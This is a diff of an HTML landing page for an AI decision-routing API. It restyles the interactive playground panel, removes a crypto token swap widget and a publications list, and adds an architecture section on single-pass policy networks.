-        <div class="flex items-center gap-2 font-mono text-xs text-slate-400 bg-slate-900 px-3 py-1.5 rounded-lg border border-slate-800">
-          <span class="w-2 h-2 rounded-full bg-emerald-400 animate-pulse"></span>
-          <span>Gateway: Online &middot; P50 &lt; 15ms</span>
+        <div class="flex items-center gap-2 font-mono text-xs text-slate-400 bg-lab-900 px-3 py-1.5 rounded border border-lab-border">
+          <span class="w-1.5 h-1.5 rounded-full bg-emerald-400"></span>
+          <span>Gateway: Live &middot; $0.001 / call</span>
         </div>
       </div>
 
@@ -330,73 +383,67 @@
         <!-- Left Column: Inputs & Scenario Selection (7 cols) -->
         <div class="lg:col-span-7 space-y-4">
           
-          <div class="lab-glass p-5 rounded-xl border border-slate-800">
-            <div class="flex items-center justify-between mb-3">
-              <label class="text-xs font-mono uppercase tracking-wider text-slate-400 flex items-center gap-1.5">
-                <i data-lucide="sliders" class="w-3.5 h-3.5 text-cyan-400"></i> Select Decision Scenario
-              </label>
-              <span class="text-[11px] font-mono text-emerald-400" id="presetTag">PRESET: TOOL ROUTING</span>
+          <div class="lab-panel p-5 rounded-lg">
+            
+            <!-- Scenario Selector Pills -->
+            <div class="flex items-center justify-between mb-3 text-xs font-mono">
+              <span class="text-slate-400 uppercase">Preset Scenarios:</span>
+              <span class="text-emerald-400" id="presetTag">TOOL ROUTING</span>
             </div>
 
-            <!-- Scenario Pills -->
-            <div class="grid grid-cols-2 sm:grid-cols-4 gap-2 mb-4">
-              <button onclick="selectScenario('tool_routing')" id="pill-tool_routing" class="scenario-pill px-2.5 py-2 rounded-lg bg-emerald-950/60 border border-emerald-500/50 text-emerald-300 text-xs font-mono text-left transition-all">
-                <div class="font-bold">Agent Tool</div>
-                <div class="text-[10px] text-slate-400">Router choice</div>
+            <div class="grid grid-cols-3 gap-2 mb-4">
+              <button onclick="selectScenario('tool_routing')" id="pill-tool_routing" class="scenario-btn p-2 rounded bg-lab-850 border border-emerald-500/40 text-left font-mono text-xs transition-colors">
+                <div class="font-medium text-white">Agent Tool</div>
+                <div class="text-[10px] text-slate-400">Router selection</div>
               </button>
-              <button onclick="selectScenario('maze_step')" id="pill-maze_step" class="scenario-pill px-2.5 py-2 rounded-lg bg-slate-900/60 border border-slate-800 text-slate-300 hover:border-slate-700 text-xs font-mono text-left transition-all">
-                <div class="font-bold">Maze 8x8</div>
-                <div class="text-[10px] text-slate-400">MDP navigation</div>
+              <button onclick="selectScenario('maze_step')" id="pill-maze_step" class="scenario-btn p-2 rounded bg-lab-900 border border-lab-border text-left font-mono text-xs text-slate-400 hover:text-white transition-colors">
+                <div class="font-medium text-slate-200">Gymnasium Maze</div>
+                <div class="text-[10px] text-slate-500">8x8 MDP step</div>
               </button>
-              <button onclick="selectScenario('security_filter')" id="pill-security_filter" class="scenario-pill px-2.5 py-2 rounded-lg bg-slate-900/60 border border-slate-800 text-slate-300 hover:border-slate-700 text-xs font-mono text-left transition-all">
-                <div class="font-bold">Security</div>
-                <div class="text-[10px] text-slate-400">Risk guardrail</div>
-              </button>
-              <button onclick="selectScenario('custom')" id="pill-custom" class="scenario-pill px-2.5 py-2 rounded-lg bg-slate-900/60 border border-slate-800 text-slate-300 hover:border-slate-700 text-xs font-mono text-left transition-all">
-                <div class="font-bold">Custom</div>
-                <div class="text-[10px] text-slate-400">Freeform input</div>
+              <button onclick="selectScenario('security_filter')" id="pill-security_filter" class="scenario-btn p-2 rounded bg-lab-900 border border-lab-border text-left font-mono text-xs text-slate-400 hover:text-white transition-colors">
+                <div class="font-medium text-slate-200">Security Gate</div>
+                <div class="text-[10px] text-slate-500">Risk guardrail</div>
               </button>
             </div>
 
             <!-- State Input -->
-            <div class="space-y-1.5 mb-3">
-              <label class="text-xs font-mono text-slate-400 flex items-center justify-between">
-                <span>State Representation Context ($s_t \in \mathcal{S}$):</span>
-                <span class="text-[11px] text-slate-500" id="stateCharCount">0 chars</span>
+            <div class="mb-3">
+              <label class="block text-xs font-mono text-slate-400 mb-1.5 flex justify-between">
+                <span>Observation State ($s_t \in \mathcal{S}$):</span>
+                <span class="text-slate-500" id="stateCharCount">0 chars</span>
               </label>
-              <textarea id="playgroundState" rows="3" class="w-full bg-slate-950 border border-slate-800 rounded-lg p-3 text-xs font-mono text-slate-200 focus:outline-none focus:border-emerald-500 transition-colors" placeholder="Enter state description or observation..."></textarea>
+              <textarea id="playgroundState" rows="3" class="w-full bg-lab-950 border border-lab-border rounded p-3 text-xs font-mono text-slate-200 focus:outline-none focus:border-slate-400 transition-colors" placeholder="Enter structured observation..."></textarea>
             </div>
 
-            <!-- Candidate Action Space -->
-            <div class="space-y-1.5 mb-4">
-              <label class="text-xs font-mono text-slate-400 flex items-center justify-between">
-                <span>Candidate Action Space ($\mathcal{A}_t$ - comma separated):</span>
-                <span class="text-[11px] text-slate-500" id="optionsCount">4 choices</span>
+            <!-- Actions Input -->
+            <div class="mb-4">
+              <label class="block text-xs font-mono text-slate-400 mb-1.5">
+                <span>Admissible Actions ($\mathcal{A}_t$ - newline separated):</span>
               </label>
-              <input type="text" id="playgroundOptions" class="w-full bg-slate-950 border border-slate-800 rounded-lg p-2.5 text-xs font-mono text-slate-200 focus:outline-none focus:border-emerald-500 transition-colors" value="web_search, bash_tool, database_query, ask_human">
+              <textarea id="playgroundOptions" rows="4" class="w-full bg-lab-950 border border-lab-border rounded p-3 text-xs font-mono text-slate-200 focus:outline-none focus:border-slate-400 transition-colors" placeholder="One action per line..."></textarea>
             </div>
 
-            <!-- Execution Buttons -->
-            <div class="flex items-center gap-3 pt-2">
-              <button onclick="executePlaygroundInference()" id="playRunBtn" class="flex-1 py-2.5 px-4 rounded-lg bg-emerald-500 hover:bg-emerald-400 text-black font-bold text-xs font-mono transition-all shadow-lg shadow-emerald-500/20 flex items-center justify-center gap-2">
+            <!-- Execute Button -->
+            <div class="flex items-center gap-3">
+              <button onclick="executePlaygroundInference()" id="playRunBtn" class="flex-1 py-2.5 px-4 rounded bg-emerald-500 hover:bg-emerald-400 text-black font-semibold text-xs font-mono transition-colors flex items-center justify-center gap-2">
                 <i data-lucide="play" class="w-3.5 h-3.5 fill-current"></i>
                 <span id="playRunBtnText">Run System-1 Forward Pass</span>
               </button>
-              <button onclick="resetPlaygroundPreset()" class="py-2.5 px-3 rounded-lg bg-slate-900 hover:bg-slate-800 border border-slate-800 text-slate-400 hover:text-white text-xs font-mono transition-all flex items-center gap-1">
-                <i data-lucide="rotate-ccw" class="w-3.5 h-3.5"></i>
-                <span>Reset</span>
+
+              <button onclick="resetPlaygroundPreset()" class="py-2.5 px-3 rounded bg-lab-900 hover:bg-lab-800 border border-lab-border text-slate-400 hover:text-white text-xs font-mono transition-colors">
+                Reset
               </button>
             </div>
 
           </div>
 
           <!-- Direct Endpoint Details Info Card -->
-          <div class="p-3.5 rounded-lg bg-slate-900/60 border border-slate-800 text-[11px] font-mono text-slate-400 flex flex-col sm:flex-row items-start sm:items-center justify-between gap-2">
+          <div class="p-3.5 rounded bg-lab-900 border border-lab-border text-[11px] font-mono text-slate-400 flex flex-col sm:flex-row items-start sm:items-center justify-between gap-2">
             <div class="flex items-center gap-2">
-              <span class="px-1.5 py-0.5 rounded bg-emerald-950 text-emerald-400 border border-emerald-800 text-[10px]">POST</span>
+              <span class="px-1.5 py-0.5 rounded bg-lab-850 text-slate-300 border border-lab-border text-[10px]">POST</span>
               <span class="text-slate-300">https://sivlet-x402-gateway.sivletlabs.workers.dev/v1/systemone</span>
             </div>
-            <span class="text-cyan-400 font-semibold">$0.001 / call</span>
+            <span class="text-slate-400">RFC 7231 / HTTP 402</span>
           </div>
 
         </div>
@@ -404,92 +451,68 @@
         <!-- Right Column: Visualized Probabilities & Telemetry (5 cols) -->
         <div class="lg:col-span-5 space-y-4">
           
-          <div class="lab-glass p-5 rounded-xl border border-slate-800 flex flex-col justify-between h-full">
+          <div class="lab-panel p-5 rounded-lg flex flex-col justify-between h-full">
             <div>
-              <div class="flex items-center justify-between pb-3 border-b border-slate-800 mb-4">
-                <span class="text-xs font-mono uppercase tracking-wider text-slate-400 flex items-center gap-1.5">
-                  <i data-lucide="activity" class="w-3.5 h-3.5 text-emerald-400"></i> Calibrated Posterior Simplex
-                </span>
-                <span class="text-xs font-mono text-emerald-400" id="resultLatency">0.0 ms</span>
+              <div class="flex items-center justify-between pb-3 border-b border-lab-border mb-4 font-mono text-xs">
+                <span class="text-slate-400 uppercase tracking-wider">Posterior Simplex Distribution</span>
+                <span class="text-emerald-400 font-semibold" id="resultLatency">0.0 ms</span>
               </div>
 
-              <!-- Top Selection Winner Card -->
-              <div class="bg-slate-950 p-3.5 rounded-lg border border-slate-800/80 mb-4 flex items-center justify-between">
+              <!-- Argmax Winner -->
+              <div class="bg-lab-950 p-3.5 rounded border border-lab-border mb-4 flex items-center justify-between font-mono">
                 <div>
-                  <div class="text-[10px] font-mono text-slate-500 uppercase tracking-wider">Top Argmax Action</div>
-                  <div class="text-base font-mono font-bold text-white mt-0.5 flex items-center gap-2" id="winnerAction">
+                  <div class="text-[10px] text-slate-500 uppercase">Argmax Decision</div>
+                  <div class="text-sm font-bold text-white mt-0.5 flex items-center gap-1.5" id="winnerAction">
                     <span>web_search</span>
-                    <i data-lucide="check-circle" class="w-4 h-4 text-emerald-400"></i>
+                    <i data-lucide="check-circle" class="w-3.5 h-3.5 text-emerald-400"></i>
                   </div>
                 </div>
                 <div class="text-right">
-                  <div class="text-[10px] font-mono text-slate-500 uppercase tracking-wider">Confidence</div>
-                  <div class="text-base font-mono font-bold text-emerald-400 mt-0.5" id="winnerConfidence">96.0%</div>
+                  <div class="text-[10px] text-slate-500 uppercase">Confidence</div>
+                  <div class="text-sm font-bold text-emerald-400 mt-0.5" id="winnerConfidence">96.0%</div>
                 </div>
               </div>
 
               <!-- Probability Simplex Bars -->
-              <div class="space-y-3 mb-4" id="probabilityBarsContainer">
-                <!-- Dynamically generated bars -->
+              <div class="space-y-3 mb-4 font-mono text-xs" id="probabilityBarsContainer">
                 <div>
-                  <div class="flex justify-between text-xs font-mono mb-1">
+                  <div class="flex justify-between mb-1">
                     <span class="text-slate-300">web_search</span>
                     <span class="text-emerald-400 font-semibold">96.0%</span>
                   </div>
-                  <div class="w-full bg-slate-900 h-2 rounded-full overflow-hidden border border-slate-800">
-                    <div class="bg-gradient-to-r from-emerald-500 to-cyan-400 h-full rounded-full transition-all duration-500" style="width: 96%"></div>
+                  <div class="w-full bg-lab-950 h-2 rounded overflow-hidden border border-lab-border">
+                    <div class="bg-emerald-500 h-full rounded transition-all duration-300" style="width: 96%"></div>
                   </div>
                 </div>
-
                 <div>
-                  <div class="flex justify-between text-xs font-mono mb-1">
+                  <div class="flex justify-between mb-1">
                     <span class="text-slate-400">bash_tool</span>
                     <span class="text-slate-400">1.3%</span>
                   </div>
-                  <div class="w-full bg-slate-900 h-2 rounded-full overflow-hidden border border-slate-800">
-                    <div class="bg-slate-700 h-full rounded-full transition-all duration-500" style="width: 1.3%"></div>
-                  </div>
-                </div>
-
-                <div>
-                  <div class="flex justify-between text-xs font-mono mb-1">
-                    <span class="text-slate-400">database_query</span>
-                    <span class="text-slate-400">1.3%</span>
-                  </div>
-                  <div class="w-full bg-slate-900 h-2 rounded-full overflow-hidden border border-slate-800">
-                    <div class="bg-slate-700 h-full rounded-full transition-all duration-500" style="width: 1.3%"></div>
-                  </div>
-                </div>
-
-                <div>
-                  <div class="flex justify-between text-xs font-mono mb-1">
-                    <span class="text-slate-400">ask_human</span>
-                    <span class="text-slate-400">1.3%</span>
-                  </div>
-                  <div class="w-full bg-slate-900 h-2 rounded-full overflow-hidden border border-slate-800">
-                    <div class="bg-slate-700 h-full rounded-full transition-all duration-500" style="width: 1.3%"></div>
+                  <div class="w-full bg-lab-950 h-2 rounded overflow-hidden border border-lab-border">
+                    <div class="bg-slate-700 h-full rounded transition-all duration-300" style="width: 1.3%"></div>
                   </div>
                 </div>
               </div>
 
-              <!-- Mathematical Statistics -->
-              <div class="grid grid-cols-2 gap-2 pt-3 border-t border-slate-800/80 text-[11px] font-mono">
-                <div class="bg-slate-950/60 p-2 rounded border border-slate-800/60 flex justify-between">
+              <!-- Proper Scoring Diagnostics -->
+              <div class="grid grid-cols-2 gap-2 pt-3 border-t border-lab-border text-[11px] font-mono">
+                <div class="bg-lab-950 p-2 rounded border border-lab-border flex justify-between">
                   <span class="text-slate-500">Brier Score:</span>
-                  <span class="text-cyan-400 font-semibold" id="resultBrier">-0.042</span>
+                  <span class="text-slate-300 font-semibold" id="resultBrier">-0.042</span>
                 </div>
-                <div class="bg-slate-950/60 p-2 rounded border border-slate-800/60 flex justify-between">
+                <div class="bg-lab-950 p-2 rounded border border-lab-border flex justify-between">
                   <span class="text-slate-500">Entropy $\mathcal{H}$:</span>
-                  <span class="text-purple-400 font-semibold" id="resultEntropy">0.068</span>
+                  <span class="text-slate-300 font-semibold" id="resultEntropy">0.068</span>
                 </div>
               </div>
             </div>
 
             <!-- Raw JSON Toggle -->
-            <div class="mt-4 pt-3 border-t border-slate-800/80 flex items-center justify-between">
-              <span class="text-[10px] font-mono text-slate-500">Settled to Treasury: 0x6B50...5F8A</span>
-              <button onclick="toggleRawJsonModal()" class="text-xs font-mono text-cyan-400 hover:text-cyan-300 flex items-center gap-1 hover:underline">
-                <span>Inspect Raw JSON</span>
+            <div class="mt-4 pt-3 border-t border-lab-border flex items-center justify-between text-xs font-mono">
+              <span class="text-slate-500 text-[10px]">Settlement: 0x6B50...5F8A</span>
+              <button onclick="toggleRawJsonModal()" class="text-slate-400 hover:text-white flex items-center gap-1 hover:underline">
+                <span>View Raw JSON</span>
                 <i data-lucide="code" class="w-3 h-3"></i>
               </button>
             </div>
@@ -504,309 +527,78 @@
   </section>
 
   <!-- ========================================================================= -->
-  <!-- 4. ACQUIRE $SIVLET & DIRECT ON-PAGE SWAP TERMINAL                          -->
+  <!-- 5. SCIENTIFIC ARCHITECTURE & RL EVALUATION MATRIX                         -->
   <!-- ========================================================================= -->
-  <section id="swap-widget" class="py-20 border-t border-slate-800 relative z-10 bg-lab-black">
+  <section id="research" class="py-20 border-b border-lab-border z-10">
     <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
       
-      <div class="text-center max-w-3xl mx-auto mb-12">
-        <div class="inline-flex items-center gap-2 px-3 py-1 rounded-full bg-emerald-950/60 border border-emerald-500/40 text-[11px] font-mono text-emerald-400 mb-3">
-          <i data-lucide="coins" class="w-3.5 h-3.5"></i>
-          <span>Robinhood Chain Native Bonding Curve</span>
-        </div>
-        <h2 class="font-display font-bold text-2xl sm:text-4xl text-white">Acquire $SIVLET Token</h2>
-        <p class="text-xs sm:text-sm text-slate-400 mt-2 font-sans">
-          Fair launched on Pons without insider pre-mines. Directly swap native ETH on Robinhood Chain, or trade through the official Pons bonding terminal.
+      <div class="max-w-3xl mb-12">
+        <div class="text-xs font-mono text-emerald-400 uppercase tracking-wider mb-1">Architecture &amp; Theory</div>
+        <h2 class="font-display font-bold text-2xl sm:text-3xl text-white">Why System-1 Policies Replace LLM Routing</h2>
+        <p class="text-xs sm:text-sm text-slate-400 mt-2 font-sans leading-relaxed">
+          Autoregressive models incur severe latency jitter (800ms+), GPU memory bandwidth bottlenecks, and token sampling errors when applied to discrete action spaces. SivletLabs formulates single-pass policy simplex networks trained with proper scoring rules.
         </p>
-      </div>
-
-      <div class="grid grid-cols-1 lg:grid-cols-12 gap-8 items-start">
-        
-        <!-- Left Column: Direct Swap Terminal (7 cols) -->
-        <div class="lg:col-span-7">
-          <div class="lab-glass p-6 sm:p-8 rounded-2xl border border-emerald-500/25 relative overflow-hidden">
-            <div class="flex items-center justify-between pb-4 border-b border-slate-800 mb-5">
-              <div class="flex items-center gap-2">
-                <span class="w-2.5 h-2.5 rounded-full bg-emerald-400 animate-pulse"></span>
-                <span class="font-mono text-xs text-white font-bold uppercase tracking-wider">Robinhood Chain Swap Terminal</span>
-              </div>
-              <span class="text-[11px] font-mono px-2 py-0.5 rounded bg-slate-900 border border-slate-700 text-slate-300">Chain ID: 4663</span>
-            </div>
-
-            <!-- Input Asset: ETH -->
-            <div class="bg-slate-950 p-4 rounded-xl border border-slate-800 mb-3">
-              <div class="flex items-center justify-between text-xs font-mono text-slate-400 mb-2">
-                <span>You Pay (Robinhood Chain)</span>
-                <span id="userEthBalanceText">Wallet Balance: -- ETH</span>
-              </div>
-              <div class="flex items-center justify-between gap-3">
-                <input type="number" id="swapEthInput" step="0.001" min="0.001" value="0.01" oninput="calculateSwapOutput()" class="bg-transparent text-xl sm:text-2xl font-mono font-bold text-white focus:outline-none w-full" placeholder="0.0">
-                <div class="flex items-center gap-2 px-3 py-1.5 rounded-lg bg-slate-900 border border-slate-700 text-xs font-mono font-semibold text-white flex-shrink-0">
-                  <span class="w-2 h-2 rounded-full bg-cyan-400"></span>
-                  <span>ETH</span>
-                </div>
-              </div>
-              <!-- Preset Chips -->
-              <div class="flex items-center gap-2 mt-3 pt-2 border-t border-slate-900">
-                <span class="text-[10px] font-mono text-slate-500">Quick:</span>
-                <button onclick="setSwapAmount(0.005)" class="px-2 py-0.5 rounded bg-slate-900 hover:bg-slate-800 border border-slate-800 text-[10px] font-mono text-slate-300">0.005 ETH</button>
-                <button onclick="setSwapAmount(0.01)" class="px-2 py-0.5 rounded bg-slate-900 hover:bg-slate-800 border border-slate-800 text-[10px] font-mono text-slate-300">0.01 ETH</button>
-                <button onclick="setSwapAmount(0.05)" class="px-2 py-0.5 rounded bg-slate-900 hover:bg-slate-800 border border-slate-800 text-[10px] font-mono text-slate-300">0.05 ETH</button>
-                <button onclick="setSwapAmount(0.1)" class="px-2 py-0.5 rounded bg-slate-900 hover:bg-slate-800 border border-slate-800 text-[10px] font-mono text-slate-300">0.1 ETH</button>
-              </div>
-            </div>
-
-            <!-- Swap Arrow Divider -->
-            <div class="flex justify-center -my-1 relative z-10">
-              <div class="w-8 h-8 rounded-full bg-slate-900 border border-slate-700 flex items-center justify-center text-emerald-400">
-                <i data-lucide="arrow-down" class="w-4 h-4"></i>
-              </div>
-            </div>
-
-            <!-- Output Asset: $SIVLET -->
-            <div class="bg-slate-950 p-4 rounded-xl border border-slate-800 mb-5">
-              <div class="flex items-center justify-between text-xs font-mono text-slate-400 mb-2">
-                <span>You Receive (Estimated)</span>
-                <span class="text-emerald-400 text-[11px]">Pons Curve Reserve Active</span>
-              </div>
-              <div class="flex items-center justify-between gap-3">
-                <div class="text-xl sm:text-2xl font-mono font-bold text-emerald-400 truncate" id="swapOutputAmount">
-                  ~5,852,000
-                </div>
-                <div class="flex items-center gap-2 px-3 py-1.5 rounded-lg bg-emerald-950/80 border border-emerald-500/40 text-xs font-mono font-semibold text-emerald-300 flex-shrink-0">
-                  <span class="w-2 h-2 rounded-full bg-emerald-400"></span>
-                  <span>SIVLET</span>
-                </div>
-              </div>
-            </div>
-
-            <!-- Live Token Rate & Bonding Curve Graduation Tracker -->
-            <div class="space-y-3 text-xs font-mono text-slate-400 bg-slate-950/80 p-4 rounded-xl border border-slate-800/90 mb-6">
-              <!-- Live Rate -->
-              <div class="flex items-center justify-between pb-2.5 border-b border-slate-900">
-                <div class="flex items-center gap-1.5 text-slate-300">
-                  <i data-lucide="tag" class="w-3.5 h-3.5 text-cyan-400"></i>
-                  <span>Exchange Rate:</span>
-                </div>
-                <div class="text-right">
-                  <div class="text-white font-semibold" id="swapRateSivletPerEth">1 ETH &asymp; 588,560,000 SIVLET</div>
-                  <div class="text-[10px] text-emerald-400" id="swapRateUsd">1 SIVLET = $0.00000450 USD</div>
-                </div>
-              </div>
-
-              <!-- Bonding Curve Progress Bar -->
-              <div>
-                <div class="flex items-center justify-between text-xs mb-1.5">
-                  <span class="text-slate-300 flex items-center gap-1.5">
-                    <i data-lucide="compass" class="w-3.5 h-3.5 text-emerald-400"></i>
-                    <span>Bonding Curve Graduation:</span>
-                  </span>
-                  <span class="text-emerald-400 font-bold" id="bondingProgressPct">40.0%</span>
-                </div>
-                <div class="w-full bg-slate-900 h-2.5 rounded-full overflow-hidden border border-slate-800 p-0.5">
-                  <div id="bondingProgressBar" class="bg-gradient-to-r from-emerald-500 via-cyan-400 to-emerald-400 h-full rounded-full transition-all duration-700 shadow-sm shadow-emerald-500/50" style="width: 40.0%"></div>
-                </div>
-                <div class="flex justify-between items-center mt-1.5 text-[10px] text-slate-500">
-                  <span>Current: <strong class="text-slate-300 font-mono" id="bondingReserveEth">1.680 ETH</strong></span>
-                  <span>Target: <strong class="text-amber-300 font-mono">4.200 ETH</strong> (Auto Uniswap Lock)</span>
-                </div>
-              </div>
-
-              <!-- Contract & Sink Info -->
-              <div class="pt-2 border-t border-slate-900 space-y-1 text-[11px]">
-                <div class="flex justify-between">
-                  <span>Bonding Pool Contract:</span>
-                  <code class="text-slate-300 font-mono">0x5F02...Ad5601</code>
-                </div>
-                <div class="flex justify-between">
-                  <span>Deflationary Sink:</span>
-                  <span class="text-amber-400 font-medium">100% Protocol USDC buys &amp; burns</span>
-                </div>
-              </div>
-            </div>
-
-            <!-- Action Buttons -->
-            <div class="flex flex-col sm:flex-row gap-3">
-              <button onclick="executeWalletSwap()" id="swapSubmitBtn" class="flex-1 py-3 px-4 rounded-xl bg-emerald-500 hover:bg-emerald-400 text-black font-bold text-xs font-mono transition-all shadow-lg shadow-emerald-500/25 flex items-center justify-center gap-2">
-                <i data-lucide="zap" class="w-4 h-4 fill-current"></i>
-                <span id="swapSubmitBtnText">Swap via Connected Wallet</span>
-              </button>
-              
-              <a href="https://www.ponsfamily.com/launchpad/0xb7832Ca55ea7F9aa1504657376117B98deb4e2E1" target="_blank" class="py-3 px-4 rounded-xl bg-slate-900 hover:bg-slate-800 border border-slate-700 text-slate-200 text-xs font-mono font-medium transition-all flex items-center justify-center gap-2">
-                <i data-lucide="external-link" class="w-4 h-4 text-cyan-400"></i>
-                <span>Open on Pons</span>
-              </a>
-            </div>
-
-            <div class="mt-4 pt-3 border-t border-slate-800 flex items-center justify-between text-[11px] font-mono">
-              <button onclick="addTokenToMetaMask()" class="text-emerald-400 hover:text-emerald-300 flex items-center gap-1 hover:underline">
-                <i data-lucide="plus-circle" class="w-3.5 h-3.5"></i>
-                <span>Add $SIVLET to MetaMask / Wallet</span>
-              </button>
-              <button onclick="switchToRobinhoodChain()" class="text-cyan-400 hover:text-cyan-300 flex items-center gap-1 hover:underline">
-                <i data-lucide="network" class="w-3.5 h-3.5"></i>
-                <span>Switch to Robinhood Network</span>
-              </button>
-            </div>
-
-          </div>
-        </div>
-
-        <!-- Right Column: Tokenomics Transparency & On-Chain Proofs (5 cols) -->
-        <div class="lg:col-span-5 space-y-4">
-          
-          <div class="lab-glass p-6 rounded-2xl border border-slate-800">
-            <h3 class="font-display font-bold text-lg text-white mb-3 flex items-center gap-2">
-              <i data-lucide="shield-check" class="w-4 h-4 text-emerald-400"></i> Verified On-Chain Ledger
-            </h3>
-            
-            <div class="space-y-3 font-mono text-xs">
-              <div class="p-3 rounded-lg bg-slate-950 border border-slate-800">
-                <div class="text-[10px] text-slate-500 uppercase">Token Contract (SIVLET)</div>
-                <div class="flex items-center justify-between mt-1">
-                  <a href="https://robinhoodchain.blockscout.com/token/0xb7832Ca55ea7F9aa1504657376117B98deb4e2E1" target="_blank" class="text-cyan-400 hover:text-cyan-300 truncate font-semibold">
-                    0xb7832Ca55ea7F9aa1504657376117B98deb4e2E1
-                  </a>
-                  <button onclick="copyToClipboard('0xb7832Ca55ea7F9aa1504657376117B98deb4e2E1')" class="p-1 hover:text-white text-slate-500" title="Copy">
-                    <i data-lucide="copy" class="w-3.5 h-3.5"></i>
-                  </button>
-                </div>
-              </div>
-
-              <div class="p-3 rounded-lg bg-slate-950 border border-slate-800">
-                <div class="text-[10px] text-slate-500 uppercase">Treasury Engine (BuybackBurnEngine)</div>
-                <div class="flex items-center justify-between mt-1">
-                  <a href="https://robinhoodchain.blockscout.com/address/0x6B50f02D2292a28928bCe0F97b654E4DCbC75F8A" target="_blank" class="text-emerald-400 hover:text-emerald-300 truncate font-semibold">
-                    0x6B50f02D2292a28928bCe0F97b654E4DCbC75F8A
-                  </a>
-                  <button onclick="copyToClipboard('0x6B50f02D2292a28928bCe0F97b654E4DCbC75F8A')" class="p-1 hover:text-white text-slate-500" title="Copy">
-                    <i data-lucide="copy" class="w-3.5 h-3.5"></i>
-                  </button>
-                </div>
-              </div>
-
-              <div class="p-3 rounded-lg bg-slate-950 border border-slate-800">
-                <div class="text-[10px] text-slate-500 uppercase">Pons Bonding Curve Pool</div>
-                <div class="flex items-center justify-between mt-1">
-                  <a href="https://robinhoodchain.blockscout.com/address/0x5F02BE04d20aB66cf5Ea33ECda25194AECAd5601" target="_blank" class="text-purple-400 hover:text-purple-300 truncate font-semibold">
-                    0x5F02BE04d20aB66cf5Ea33ECda25194AECAd5601
-                  </a>
-                  <button onclick="copyToClipboard('0x5F02BE04d20aB66cf5Ea33ECda25194AECAd5601')" class="p-1 hover:text-white text-slate-500" title="Copy">
-                    <i data-lucide="copy" class="w-3.5 h-3.5"></i>
-                  </button>
-                </div>
-              </div>
-            </div>
-
-            <!-- Autonomous Treasury Protocol -->
-            <div class="mt-5 p-3.5 rounded-lg bg-emerald-950/40 border border-emerald-500/30 text-xs font-mono">
-              <div class="text-emerald-400 font-bold flex items-center gap-1.5 mb-1">
-                <i data-lucide="check" class="w-4 h-4"></i> Non-Custodial Protocol Flywheel
-              </div>
-              <p class="text-slate-300 text-[11px] leading-relaxed">
-                Zero developer extraction. 100% of API payments received by the treasury are programmatically committed to TWAP buybacks on Robinhood Chain, with 99% permanently incinerated to the zero address.
-              </p>
-            </div>
-          </div>
-
-        </div>
-
-      </div>
-
-    </div>
-  </section>
-
-  <!-- ========================================================================= -->
-  <!-- 5. RESEARCH PAPERS & PUBLICATIONS                                         -->
-  <!-- ========================================================================= -->
-  <section id="research" class="py-20 border-t border-slate-800 relative z-10 bg-lab-darker/40">
-    <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
-      
-      <div class="flex flex-col md:flex-row md:items-end justify-between mb-12 gap-4">
-        <div>
-          <div class="flex items-center gap-2 font-mono text-xs uppercase tracking-wider text-cyan-400 mb-1">
-            <i data-lucide="graduation-cap" class="w-4 h-4"></i> Publications &amp; Preprints
-          </div>
-          <h2 class="font-display font-bold text-2xl sm:text-3xl text-white">Scientific Research Suite</h2>
-          <p class="text-xs sm:text-sm text-slate-400 mt-1 max-w-2xl font-sans">
-            Formal mathematical foundations of non-autoregressive decision models, strictly proper scoring rules, and machine-native microeconomics.
-          </p>
-        </div>
-
-        <button onclick="openLitepaperModal()" class="px-4 py-2 rounded-lg bg-slate-900 hover:bg-slate-800 border border-slate-700 text-xs font-mono text-slate-300 hover:text-white transition-all flex items-center gap-1.5 self-start md:self-auto">
-          <i data-lucide="book" class="w-3.5 h-3.5 text-cyan-400"></i>
-          <span>Read Complete Litepaper (12pp)</span>
-        </button>
       </div>
 
       <div class="grid grid-cols-1 md:grid-cols-3 gap-6">
         
-        <!-- Paper 1 -->
-        <div class="lab-glass p-6 rounded-xl border border-slate-800 flex flex-col justify-between">
+        <!-- Pillar 1: Non-Autoregressive Simplex -->
+        <div class="lab-panel p-6 rounded-lg flex flex-col justify-between">
           <div>
-            <div class="flex items-center justify-between text-[10px] font-mono text-slate-500 mb-2">
-              <span>SIVLET-TR-2026-01</span>
-              <span class="px-1.5 py-0.5 rounded bg-slate-900 text-emerald-400 border border-slate-800">SYSTEM ARCHITECTURE</span>
+            <div class="w-7 h-7 rounded bg-lab-850 border border-lab-border flex items-center justify-center text-emerald-400 mb-4 font-mono text-xs">
+              01
             </div>
-            <h3 class="font-display font-bold text-base text-white mb-2 leading-snug">
-              Why Your Agent Router Shouldn't Be a 70B LLM: Non-Autoregressive Policies
-            </h3>
+            <h3 class="font-display font-semibold text-lg text-white mb-2">Non-Autoregressive Policy Simplex</h3>
             <p class="text-xs text-slate-400 font-sans leading-relaxed mb-4">
-              Dissects autoregressive latency jitter (800ms+) and computational waste in discrete classification. Formulates single-pass prefix KV rewind mechanisms achieving 24.3&times; throughput acceleration.
+              Discrete decisions do not require sequential token-by-token decoding. Sivlet-Decision-1 performs a single forward pass, evaluating all candidate actions simultaneously into a continuous probability simplex:
             </p>
+            <div class="p-2.5 bg-lab-950 rounded border border-lab-border font-mono text-[11px] text-slate-300">
+              $$\pi_\theta(a \mid s) \in \Delta^{K-1}, \quad \sum_{k=0}^{K-1} \pi_\theta(c_k \mid s) = 1.0$$
+            </div>
           </div>
-          <div class="pt-4 border-t border-slate-800/80 flex items-center justify-between text-xs font-mono">
-            <span class="text-slate-500">18 pages &middot; PDF</span>
-            <button onclick="openLitepaperModal()" class="text-cyan-400 hover:text-cyan-300 font-semibold hover:underline flex items-center gap-1">
-              <span>Read Manuscript</span>
-              <i data-lucide="arrow-right" class="w-3 h-3"></i>
-            </button>
+          <div class="pt-4 border-t border-lab-border mt-4 text-[11px] font-mono text-slate-500">
+            Sub-15ms deterministic inference
           </div>
         </div>
 
-        <!-- Paper 2 -->
-        <div class="lab-glass p-6 rounded-xl border border-slate-800 flex flex-col justify-between">
+        <!-- Pillar 2: Strictly Proper Scoring Rules -->
+        <div class="lab-panel p-6 rounded-lg flex flex-col justify-between">
           <div>
-            <div class="flex items-center justify-between text-[10px] font-mono text-slate-500 mb-2">
-              <span>SIVLET-TR-2026-02</span>
-              <span class="px-1.5 py-0.5 rounded bg-slate-900 text-cyan-400 border border-slate-800">SCORING RULES</span>
+            <div class="w-7 h-7 rounded bg-lab-850 border border-lab-border flex items-center justify-center text-emerald-400 mb-4 font-mono text-xs">
+              02
             </div>
-            <h3 class="font-display font-bold text-base text-white mb-2 leading-snug">
